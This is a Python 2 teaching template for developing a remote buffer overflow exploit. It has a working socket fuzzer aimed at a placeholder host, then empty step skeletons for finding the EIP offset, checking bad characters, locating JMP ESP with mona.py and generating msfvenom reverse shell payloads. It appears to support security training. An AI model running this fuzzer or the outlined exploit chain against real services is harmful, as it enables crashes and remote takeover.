#!/usr/bin/python
import socket
import sys
import time

# Outlined below is the general process for performing a Remote Buffer Overflow,
# the main differences between a Local and Remote Buffer Overflow is the that
# one requires a network socket to be created and the other does not. The above
# imports are to allow for SOCKET Creation, and the overall Overflow process is
# the same!
#
# Best Practices:
#       Use Python 2.7
#       Reference all hex values with "\x" notation
#       Redo and Validate all step if you run into errors
#
# General Buffer Overflow Process:
# Step 0: Perform Reverse Engineering/Identify Vulnerability
# Step 1: Find the Buffer Size/Offset
# Step 2: Validate EIP Overwrite
# Step 3: Identify Bad Characters to exclude from shellcode
# Step 4: Find a Valid JMP ESP (Assembly Instruction)
# Step 5: Generate Shellcode & Run Exploit

###############################################################################
# Persistent Variables (Identified through Reverse Engineering)               #
#       These are called during each step, you will see the following         #
#       variables:                                                            #
#              connection - Specifies the tuple for IP and PORT               #
#              command - Specifies an Executable Program Specific Command     #
#              shellcode - The variable holding all of your exploit string    #
###############################################################################
target_address = 'x.x.x.x'
target_port = 1234
connection = ((target_address, target_port))

#Desired Remote Command to use
command = "COM /.:/"

###############################################################################
# Step 1: Find the Buffer Size/Offset (MANUALLY)                              #
#       This shows some basic python functions that can be used throughout    #
#       your exploit development process, this includes:                      #
#              - print()                                                      #
#              - time.sleep()                                                 #
#              - lens()                                                       #
#              - while loops                                                  #
#              - for loops                                                    #
#              - try/except statements                                        #
###############################################################################
print("Setting String Variables")
buffer = ["A"]
counter = 100

while len(buffer) <= 40:
    buffer.append("A" * counter)
    counter=counter+200

print("Created %s Strings" % len(buffer))

print("Starting loop to interact with Remote Program")
for string in buffer:
    try:
        shellcode = command + string
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect(connection)
        print("Fuzzing Executable with %s bytes" % len(string))
        s.send((shellcode))
        s.close()
        time.sleep(5)
    except:
        print("Executable has crashed using with %s bytes" % len(string))
        break
###############################################################################
# YOUR TURN, DEVELOP YOUR OWN EXPLOIT                                         #
#       - Identify and Add the expected variables to your exploit             #
###############################################################################

###############################################################################
# Step 1: Find the Buffer Size/Offset (PATTERN)                               #
#       - Use a pattern Generator to create a pattern                         #
###############################################################################
'''


shellcode = command +

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(connection)
    s.send((shellcode))
    s.close()
except:
    print("bad Connection")
'''
###############################################################################
# Step 2: Validate EIP Overwrite                                              #
#       - Check that you can overwrite the EIP                                #
#       - Have you added any NOP's                                            #
###############################################################################
'''


shellcode = command +

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(connection)
    s.send((shellcode))
    s.close()
except:
    print("bad Connection")
'''
###############################################################################
# Step 3: Identify Bad Characters to exclude during shellcode generation      #
#       - Generator a list of all hex chars 0x00 - 0xFF                       #
###############################################################################
'''


shellcode = command +

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(connection)
    s.send((shellcode))
    s.close()
except:
    print("bad Connection")
'''
###############################################################################
# Step 4: Find a Valid JMP ESP (Assembly Instruction)                         #
#       - Utilize mona.py, Immunity Debugger Python Plugin                    #
#       - What Architecture is the Executable                                 #
#              Does the EIP need to be Little Endian                          #
###############################################################################
'''


shellcode = command +

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(connection)
    s.send((shellcode))
    s.close()
except:
    print("bad Connection")
'''
###############################################################################
# Step 5: Generate Shellcode & Run Exploit                                    #
#       - Using msfvenom or msfconsole generate an appropriate payload        #
#              windows/shell_reverse_tcp                                      #
#              windows/meterpreter/reverse_tcp                                #
###############################################################################
'''


shellcode = command +

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(connection)
    s.send((shellcode))
    s.close()
except:
    print("bad Connection")
'''
